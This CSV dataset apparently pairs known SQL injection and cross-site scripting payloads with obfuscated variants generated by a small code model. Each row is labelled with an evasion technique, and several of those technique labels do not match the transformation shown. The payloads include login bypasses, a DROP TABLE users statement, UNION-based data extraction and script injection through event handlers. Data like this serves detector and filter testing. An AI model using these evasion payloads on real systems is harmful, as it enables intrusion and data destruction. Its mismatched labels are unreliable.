source_index,source_payload,generated_payload,technique_used,model,label
0,1'%09OR%091=1%09--%09-,1%09OR%091=1%09--%09-,hex_encoding,qwen2.5-coder:1.5b,1
1,1'%0aAND%0a1=1%0a#,1%0aAND%0a1=1%0a#,hex_encoding,qwen2.5-coder:1.5b,1
2,'%0d%0aOR%0d%0a'a'='a,%0d%0aOR%0d%0a'a'='a,hex_encoding,qwen2.5-coder:1.5b,1
3,1`;DROP TABLE `users`;--,1%253bDROP%20TABLE%20`users`%253b--,hex_encoding,qwen2.5-coder:1.5b,1
4,` OR `1`=`1,OR%201%3D1,hex_encoding,qwen2.5-coder:1.5b,1
5,"1 UNION SELECT 0x61646d696e,0x70617373776f7264--","1 UNION SELECT 0x61646d696e,0x70617373776f7264--",hex_encoding,qwen2.5-coder:1.5b,1
6,' OR 0x31=0x31--,OR 0x31=0x31--,hex_encoding,qwen2.5-coder:1.5b,1
7,"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT version()))x FROM information_schema.tables GROUP BY x)a)","1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT version()))x FROM information_schema.tables GROUP BY x)a)",hex_encoding,qwen2.5-coder:1.5b,1
8,1)) OR (('1')=('1,1)) OR (('1')=('1,hex_encoding,qwen2.5-coder:1.5b,1
9,"'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3--","/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3--",hex_encoding,qwen2.5-coder:1.5b,1
10,'+UN'+'ION+SEL'+'ECT+1--,"+UN""ION+SEL""ECT+1--",hex_encoding,qwen2.5-coder:1.5b,1
11,1;SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END--,1;SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END--,hex_encoding,qwen2.5-coder:1.5b,1
12,<script>eval(atob('YWxlcnQoMSk='))</script>,eval(atob('YWxlcnQoMSk=')),hex_encoding,qwen2.5-coder:1.5b,1
13,"<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>","/*/**/String.fromCharCode(97,108,101,114,116,40,49,41)",comment_insertion,qwen2.5-coder:1.5b,1
14,<img src=x oNeRRor=/**/(alert)(1)>,img src=x oNeRRor=/**/(alert)(1),hex_encoding,qwen2.5-coder:1.5b,1
15,"<a href=""jav&#97;script:alert(1)"">x</a>",jav&#97;script:alert(1),hex_encoding,qwen2.5-coder:1.5b,1
16,<svg><animate onbegin=alert(1) attributeName=x>,"<svg><animate onbegin=""alert(1)"" attributeName=""x"">",hex_encoding,qwen2.5-coder:1.5b,1
17,<template><script>alert(1)</script></template>,<template><script>alert(1)</script></template>,hex_encoding,qwen2.5-coder:1.5b,1
18,<x contenteditable onfocus=alert(1) autofocus>,x contenteditable onfocus=alert(1) autofocus,hex_encoding,qwen2.5-coder:1.5b,1
19,<script>/*comment*/alert`1`</script>,<script>/*comment*/alert`1`</script>,unicode_escape_sequences,qwen2.5-coder:1.5b,1
20,"'""<img src=x id=dmFyIGE9YWxlcnQoMSk=onerror=eval(atob(this.id))>","""<img src=x id=dmFyIGE9YWxlcnQoMSk=onerror=eval(atob(this.id))>",hex_encoding,qwen2.5-coder:1.5b,1
21,"<iframe srcdoc=""&lt;script&gt;alert(1)&lt;/script&gt;"">","<iframe srcdoc=""&lt;script&gt;alert(1)&lt;/script&gt;""></iframe>",hex_encoding,qwen2.5-coder:1.5b,1
22,&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;,&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;,hex_encoding,qwen2.5-coder:1.5b,1
